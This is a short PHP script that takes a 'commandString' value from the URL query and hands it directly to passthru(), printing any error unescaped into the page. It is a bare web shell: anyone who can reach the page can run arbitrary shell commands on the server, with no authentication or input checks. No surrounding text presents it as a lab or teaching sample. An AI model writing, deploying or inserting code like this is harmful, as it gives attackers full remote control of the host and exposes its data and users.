<?php
    if (isset($_GET["commandString"])) {
        $command_string = $_GET["commandString"];

        try {
            passthru($command_string);
        } catch (Error $error) {
            echo "<p class=mt-3><b>$error</b></p>";
        }
    }
?>
